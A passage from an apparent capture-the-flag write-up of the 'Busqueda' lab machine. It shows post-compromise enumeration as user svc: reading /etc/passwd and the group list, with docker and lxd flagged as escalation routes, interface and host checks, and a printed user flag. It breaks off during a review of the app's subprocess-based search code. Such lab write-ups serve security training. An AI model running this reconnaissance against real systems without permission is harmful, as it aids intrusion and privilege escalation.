+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">svc@busqueda:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/lsb-release<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">DISTRIB_ID=Ubuntu
+</span><span class="z-text z-plain">DISTRIB_RELEASE=22.04
+</span><span class="z-text z-plain">DISTRIB_CODENAME=jammy
+</span><span class="z-text z-plain">DISTRIB_DESCRIPTION=&quot;Ubuntu 22.04.2 LTS&quot;
+</span></code></pre>
+<p>Okay, so it's Ubuntu 22.04.</p>
+<h3 id="kernel">Kernel</h3>
+<p>Let's find the kernel version of Busqueda.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">svc@busqueda:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">5.15.0-69-generic
+</span></code></pre>
+<p>It's <code>5.15.0</code>.</p>
+<h3 id="users">Users</h3>
+<p>Let's enumerate all users.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">svc@busqueda:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> grep <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>.*sh$<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/passwd<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">root
+</span><span class="z-text z-plain">svc
+</span></code></pre>
+<p>There's <code>svc</code> (us) and <code>root</code>.</p>
+<h3 id="groups">Groups</h3>
+<p>Let's enumerate all groups.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">svc@busqueda:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/group<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">adm
+</span><span class="z-text z-plain">audio
+</span><span class="z-text z-plain">backup
+</span><span class="z-text z-plain">bin
+</span><span class="z-text z-plain">cdrom
+</span><span class="z-text z-plain">crontab
+</span><span class="z-text z-plain">daemon
+</span><span class="z-text z-plain">dialout
+</span><span class="z-text z-plain">dip
+</span><span class="z-text z-plain">disk
+</span><span class="z-text z-plain">docker
+</span><span class="z-text z-plain">fax
+</span><span class="z-text z-plain">floppy
+</span><span class="z-text z-plain">fwupd-refresh
+</span><span class="z-text z-plain">games
+</span><span class="z-text z-plain">gnats
+</span><span class="z-text z-plain">input
+</span><span class="z-text z-plain">irc
+</span><span class="z-text z-plain">kmem
+</span><span class="z-text z-plain">kvm
+</span><span class="z-text z-plain">landscape
+</span><span class="z-text z-plain">_laurel
+</span><span class="z-text z-plain">list
+</span><span class="z-text z-plain">lp
+</span><span class="z-text z-plain">lxd
+</span><span class="z-text z-plain">mail
+</span><span class="z-text z-plain">man
+</span><span class="z-text z-plain">messagebus
+</span><span class="z-text z-plain">netdev
+</span><span class="z-text z-plain">news
+</span><span class="z-text z-plain">nogroup
+</span><span class="z-text z-plain">operator
+</span><span class="z-text z-plain">plugdev
+</span><span class="z-text z-plain">proxy
+</span><span class="z-text z-plain">render
+</span><span class="z-text z-plain">root
+</span><span class="z-text z-plain">sasl
+</span><span class="z-text z-plain">sgx
+</span><span class="z-text z-plain">shadow
+</span><span class="z-text z-plain">src
+</span><span class="z-text z-plain">_ssh
+</span><span class="z-text z-plain">ssl-cert
+</span><span class="z-text z-plain">staff
+</span><span class="z-text z-plain">sudo
+</span><span class="z-text z-plain">svc
+</span><span class="z-text z-plain">sys
+</span><span class="z-text z-plain">syslog
+</span><span class="z-text z-plain">systemd-journal
+</span><span class="z-text z-plain">systemd-network
+</span><span class="z-text z-plain">systemd-resolve
+</span><span class="z-text z-plain">systemd-timesync
+</span><span class="z-text z-plain">tape
+</span><span class="z-text z-plain">tcpdump
+</span><span class="z-text z-plain">tss
+</span><span class="z-text z-plain">tty
+</span><span class="z-text z-plain">users
+</span><span class="z-text z-plain">utmp
+</span><span class="z-text z-plain">uucp
+</span><span class="z-text z-plain">uuidd
+</span><span class="z-text z-plain">video
+</span><span class="z-text z-plain">voice
+</span><span class="z-text z-plain">www-data
+</span></code></pre>
+<p>The <code>docker</code> and <code>lxd</code> groups are interesting to elevate privileges.</p>
+<h3 id="nics">NICs</h3>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">svc@busqueda:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ifconfig</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">br-c954bf22b8b2: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
+</span><span class="z-text z-plain">        inet 172.20.0.1  netmask 255.255.0.0  broadcast 172.20.255.255
+</span><span class="z-text z-plain">        ether 02:42:45:be:a3:50  txqueuelen 0  (Ethernet)
+</span><span class="z-text z-plain">        RX packets 0  bytes 0 (0.0 B)
+</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
+</span><span class="z-text z-plain">        TX packets 0  bytes 0 (0.0 B)
+</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">br-cbf2c5ce8e95: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+</span><span class="z-text z-plain">        inet 172.19.0.1  netmask 255.255.0.0  broadcast 172.19.255.255
+</span><span class="z-text z-plain">        inet6 fe80::42:82ff:fe1d:4ddd  prefixlen 64  scopeid 0x20&lt;link&gt;
+</span><span class="z-text z-plain">        ether 02:42:82:1d:4d:dd  txqueuelen 0  (Ethernet)
+</span><span class="z-text z-plain">        RX packets 116  bytes 12814 (12.8 KB)
+</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
+</span><span class="z-text z-plain">        TX packets 107  bytes 26915 (26.9 KB)
+</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">br-fba5a3e31476: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
+</span><span class="z-text z-plain">        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
+</span><span class="z-text z-plain">        ether 02:42:3d:4b:e3:bb  txqueuelen 0  (Ethernet)
+</span><span class="z-text z-plain">        RX packets 0  bytes 0 (0.0 B)
+</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
+</span><span class="z-text z-plain">        TX packets 0  bytes 0 (0.0 B)
+</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">docker0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
+</span><span class="z-text z-plain">        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+</span><span class="z-text z-plain">        ether 02:42:0c:96:f2:07  txqueuelen 0  (Ethernet)
+</span><span class="z-text z-plain">        RX packets 0  bytes 0 (0.0 B)
+</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
+</span><span class="z-text z-plain">        TX packets 0  bytes 0 (0.0 B)
+</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+</span><span class="z-text z-plain">        inet 10.10.11.208  netmask 255.255.254.0  broadcast 10.10.11.255
+</span><span class="z-text z-plain">        inet6 fe80::250:56ff:feb9:4840  prefixlen 64  scopeid 0x20&lt;link&gt;
+</span><span class="z-text z-plain">        inet6 dead:beef::250:56ff:feb9:4840  prefixlen 64  scopeid 0x0&lt;global&gt;
+</span><span class="z-text z-plain">        ether 00:50:56:b9:48:40  txqueuelen 1000  (Ethernet)
+</span><span class="z-text z-plain">        RX packets 191  bytes 23351 (23.3 KB)
+</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
+</span><span class="z-text z-plain">        TX packets 289  bytes 36267 (36.2 KB)
+</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+</span><span class="z-text z-plain">        inet 127.0.0.1  netmask 255.0.0.0
+</span><span class="z-text z-plain">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+</span><span class="z-text z-plain">        loop  txqueuelen 1000  (Local Loopback)
+</span><span class="z-text z-plain">        RX packets 539  bytes 38885 (38.8 KB)
+</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
+</span><span class="z-text z-plain">        TX packets 539  bytes 38885 (38.8 KB)
+</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">veth05a10ec: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+</span><span class="z-text z-plain">        inet6 fe80::1847:9dff:fec8:1e37  prefixlen 64  scopeid 0x20&lt;link&gt;
+</span><span class="z-text z-plain">        ether 1a:47:9d:c8:1e:37  txqueuelen 0  (Ethernet)
+</span><span class="z-text z-plain">        RX packets 808  bytes 334155 (334.1 KB)
+</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
+</span><span class="z-text z-plain">        TX packets 850  bytes 161498 (161.4 KB)
+</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">veth4577fd8: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+</span><span class="z-text z-plain">        inet6 fe80::4089:44ff:fe8d:eda9  prefixlen 64  scopeid 0x20&lt;link&gt;
+</span><span class="z-text z-plain">        ether 42:89:44:8d:ed:a9  txqueuelen 0  (Ethernet)
+</span><span class="z-text z-plain">        RX packets 732  bytes 133757 (133.7 KB)
+</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
+</span><span class="z-text z-plain">        TX packets 708  bytes 320957 (320.9 KB)
+</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span></code></pre>
+<p>There are physical Ethernet interfaces, virtual Ethernet interfaces, the
+loopback interface and a few bridges (including one for Docker).</p>
+<h3 id="hostname">Hostname</h3>
+<p>What is Busqueda's hostname?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">svc@busqueda:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> hostname</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">busqueda
+</span></code></pre>
+<p>Yeah I know, very surprising.</p>
+<h2 id="system-enumeration">System enumeration</h2>
+<h3 id="flags">Flags</h3>
+<p>If we check our home folder, we find the user flag.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">svc@busqueda:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/home/svc/user.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">24e053901c93a1184a983b81af96883f
+</span></code></pre>
+<h3 id="home-folders">Home folders</h3>
+<p>If we explore our home folder, we notice a <code>.gitconfig</code> file:</p>
+<pre class="z-code"><code><span class="z-text z-plain">[user]
+</span><span class="z-text z-plain">    email = cody@searcher.htb
+</span><span class="z-text z-plain">    name = cody
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>This user actually corresponds to <code>cody</code>. The presence of this file suggests
+that Git is used on the system.</p>
+<h3 id="website-code-review">Website code review</h3>
+<p>Let's review the content of the Apache website, located at <code>/var/www/app</code>.</p>
+<pre data-lang="py" class="language-py z-code"><code class="language-py" data-lang="py"><span class="z-source z-python"><span class="z-keyword z-operator z-comparison z-python">&lt;</span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-other z-constant z-python">SNIP</span></span><span class="z-keyword z-operator z-comparison z-python">&gt;</span>
+</span><span class="z-source z-python"><span class="z-meta z-annotation z-python"><span class="z-punctuation z-definition z-annotation z-python">@</span><span class="z-meta z-annotation z-function z-python"></span></span><span class="z-meta z-annotation z-function z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">app</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-annotation z-function z-python"><span class="z-meta z-generic-name z-python">route</span></span></span></span><span class="z-meta z-annotation z-function z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span></span><span class="z-meta z-annotation z-arguments z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">/<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span></span><span class="z-meta z-annotation z-function z-python"><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python"><span class="z-meta z-function z-python"><span class="z-storage z-type z-function z-python"><span class="z-keyword z-declaration z-function z-python">def</span></span> <span class="z-entity z-name z-function z-python"><span class="z-meta z-generic-name z-python">index</span></span></span><span class="z-meta z-function z-parameters z-python"><span class="z-punctuation z-section z-parameters z-begin z-python">(</span></span><span class="z-meta z-function z-parameters z-python"><span class="z-punctuation z-section z-parameters z-end z-python">)</span></span><span class="z-meta z-function z-python"><span class="z-punctuation z-section z-function z-begin z-python">:</span></span>
+</span><span class="z-source z-python">    <span class="z-keyword z-control z-flow z-return z-python">return</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">render_template</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">index.html<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-variable z-parameter z-python">options</span><span class="z-keyword z-operator z-assignment z-python">=</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">Engine</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-support z-variable z-magic z-python">__members__</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-variable z-parameter z-python">error</span><span class="z-keyword z-operator z-assignment z-python">=</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">
+</span><span class="z-source z-python"><span class="z-meta z-annotation z-python"><span class="z-punctuation z-definition z-annotation z-python">@</span><span class="z-meta z-annotation z-function z-python"></span></span><span class="z-meta z-annotation z-function z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">app</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-annotation z-function z-python"><span class="z-meta z-generic-name z-python">route</span></span></span></span><span class="z-meta z-annotation z-function z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span></span><span class="z-meta z-annotation z-arguments z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">/search<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-variable z-parameter z-python">methods</span><span class="z-keyword z-operator z-assignment z-python">=</span><span class="z-meta z-sequence z-list z-python"><span class="z-punctuation z-section z-sequence z-begin z-python">[</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">POST<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-sequence z-end z-python">]</span></span></span><span class="z-meta z-annotation z-function z-python"><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python"><span class="z-meta z-function z-python"><span class="z-storage z-type z-function z-python"><span class="z-keyword z-declaration z-function z-python">def</span></span> <span class="z-entity z-name z-function z-python"><span class="z-meta z-generic-name z-python">search</span></span></span><span class="z-meta z-function z-parameters z-python"><span class="z-punctuation z-section z-parameters z-begin z-python">(</span></span><span class="z-meta z-function z-parameters z-python"><span class="z-punctuation z-section z-parameters z-end z-python">)</span></span><span class="z-meta z-function z-python"><span class="z-punctuation z-section z-function z-begin z-python">:</span></span>
+</span><span class="z-source z-python">    <span class="z-meta z-statement z-exception z-try z-python"><span class="z-keyword z-control z-exception z-try z-python">try</span><span class="z-punctuation z-section z-block z-exception z-try z-python">:</span></span>
+</span><span class="z-source z-python">        <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">engine</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">request</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">form</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">get</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">engine<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">        <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">query</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">request</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">form</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">get</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">query<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">        <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">auto_redirect</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">request</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">form</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">get</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">auto_redirect<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">        <span class="z-meta z-statement z-conditional z-if z-python"><span class="z-keyword z-control z-conditional z-if z-python">if</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">engine</span></span> <span class="z-keyword z-operator z-logical z-python">in</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">Engine</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-support z-variable z-magic z-python">__members__</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">keys</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-section z-block z-conditional z-if z-python">:</span></span>
+</span><span class="z-source z-python">            <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">arg_list</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-sequence z-list z-python"><span class="z-punctuation z-section z-sequence z-begin z-python">[</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">searchor<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-separator z-sequence z-python">,</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">search<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-separator z-sequence z-python">,</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">engine</span></span><span class="z-punctuation z-separator z-sequence z-python">,</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">query</span></span><span class="z-punctuation z-section z-sequence z-end z-python">]</span></span>
+</span><span class="z-source z-python">            <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">r</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">subprocess</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">run</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">arg_list</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-variable z-parameter z-python">capture_output</span><span class="z-keyword z-operator z-assignment z-python">=</span><span class="z-constant z-language z-python">True</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">            <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">url</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">r</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">stdout</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">strip</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">decode</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">            <span class="z-meta z-statement z-conditional z-if z-python"><span class="z-keyword z-control z-conditional z-if z-python">if</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">auto_redirect</span></span> <span class="z-keyword z-operator z-logical z-python">is</span> <span class="z-keyword z-operator z-logical z-python">not</span> <span class="z-constant z-language z-python">None</span><span class="z-punctuation z-section z-block z-conditional z-if z-python">:</span></span>
